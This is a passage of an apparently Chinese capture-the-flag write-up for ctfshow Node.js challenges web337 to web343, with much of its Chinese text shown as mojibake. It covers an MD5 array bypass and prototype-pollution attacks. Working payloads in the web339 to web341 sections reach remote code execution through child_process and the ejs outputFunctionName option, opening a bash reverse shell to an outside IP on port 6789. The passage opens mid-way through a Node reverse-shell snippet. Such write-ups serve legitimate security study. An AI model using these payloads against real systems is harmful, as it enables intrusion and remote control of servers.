class="token punctuation">;</span>    client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">1211</span><span class="token punctuation">,</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web337-æ•°ç»„ç»•è¿‡MD5"><a href="#web337-æ•°ç»„ç»•è¿‡MD5" class="headerlink" title="web337(æ•°ç»„ç»•è¿‡MD5)"></a>web337(æ•°ç»„ç»•è¿‡MD5)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><p><code>a[x]=1&amp;b[x]=2</code></p><p>æ•°ç»„ä¼šè¢«è§£ææˆ<code>[object Object]</code></p><p><img src="web337.png" loading="lazy"></p><h4 id="web338-åŸå‹é“¾æ±¡æŸ“"><a href="#web338-åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="web338(åŸå‹é“¾æ±¡æŸ“)"></a>web338(åŸå‹é“¾æ±¡æŸ“)</h4><p>ç»™äº†æºç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// common.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</a></p><p>çœ‹åˆ°äº†copyæ“ä½œè€ƒè™‘åŸå‹é“¾æ±¡æŸ“ï¼Œäºæ˜¯å°è¯•æ±¡æŸ“Objectç±»ï¼Œæ·»åŠ {â€œctfshowâ€:â€œ36dboyâ€}å±æ€§</p><pre class="language-json" data-language="json"><code class="language-json">POST<span class="token operator">:</span>Content-Type<span class="token operator">:</span> application/json<span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web339-æ¨¡å—æ¸²æŸ“-åå¼¹shell"><a href="#web339-æ¨¡å—æ¸²æŸ“-åå¼¹shell" class="headerlink" title="web339(æ¨¡å—æ¸²æŸ“ åå¼¹shell)"></a>web339(æ¨¡å—æ¸²æŸ“ åå¼¹shell)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// api.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>åŸå‹é“¾æ±¡æŸ“è¦†ç›– query å®ç°å‘½ä»¤æ‰§è¡Œ</p><p>Functionç¯å¢ƒä¸‹æ²¡æœ‰requireå‡½æ•°ï¼Œä¸èƒ½è·å¾—child_processæ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨process.mainModule.constructor._loadæ¥ä»£æ›¿requireã€‚</p><p>Function(query)(query)å¯ä»¥æ‰§è¡Œqueryå¯¹åº”çš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡è¦†ç›–ï¼Œå°†queryçš„å€¼ä½œä¸ºåå¼¹shellçš„ç‚¹ã€‚</p><p>é¢„æœŸè§£<br>å…ˆæŠ“åŒ…è®¿é—®&#x2F;loginï¼Œå®ç°queryå€¼çš„è¦†ç›–ï¼Œå†POSTè®¿é—®&#x2F;apiæ¥æ‰§è¡Œqueryçš„å€¼ã€‚</p><p>ç”¨åå¼¹shellçš„å€¼è¦†ç›–ï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web339.png" loading="lazy"></p><h4 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>è¿™æ¬¡userå¯¹è±¡æ±¡æŸ“äº†ä¸¤å±‚ï¼Œå¯ä»¥å°å°æµ‹è¯•ä¸€ä¸‹</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> payload <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"__proto__":&#123;"query":true&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>payload<span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'payload:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">// &#123; ['__proto__']: &#123; ['__proto__']: &#123; query: true &#125; &#125; &#125;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Object:'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>query<span class="token punctuation">)</span> <span class="token comment">// true</span></code></pre><p>å½“æˆ‘ä»¬åµŒå¥—ä¸¤å±‚<code>__proto__</code>æ—¶ï¼Œä¸ç®¡æ˜¯userå¯¹è±¡è¿˜æ˜¯user.userinfoå¯¹è±¡éƒ½å­˜åœ¨queryå±æ€§ï¼Œå¹¶æˆåŠŸè¢«èµ‹å€¼ã€‚</p><p>Payloadï¼š</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web341-ejsæ¨¡æ¿æ¸²æŸ“"><a href="#web341-ejsæ¨¡æ¿æ¸²æŸ“" class="headerlink" title="web341(ejsæ¨¡æ¿æ¸²æŸ“)"></a>web341(ejsæ¨¡æ¿æ¸²æŸ“)</h4><p>è¿™æ¬¡ä¾æ—§æ˜¯ä¸¤å±‚userï¼Œä½†æ˜¯æ²¡api.jsäº†</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_llama1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"');var _llama2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE</a></p><p><a href="https://xz.aliyun.com/t/6113?time__1311=n4+xnD0DgDcDRlWDkDlhAe0=t+3q0odwrmxTD">XNUCA2019 Hardjsé¢˜è§£ ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE</a></p><p>è¿™æ¬¡flagåœ¨æ ¹ç›®å½•</p><h4 id="web342-343-jabeæ¨¡æ¿æ¸²æŸ“"><a href="#web342-343-jabeæ¨¡æ¿æ¸²æŸ“" class="headerlink" title="web342-343(jabeæ¨¡æ¿æ¸²æŸ“)"></a>web342-343(jabeæ¨¡æ¿æ¸²æŸ“)</h4><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span 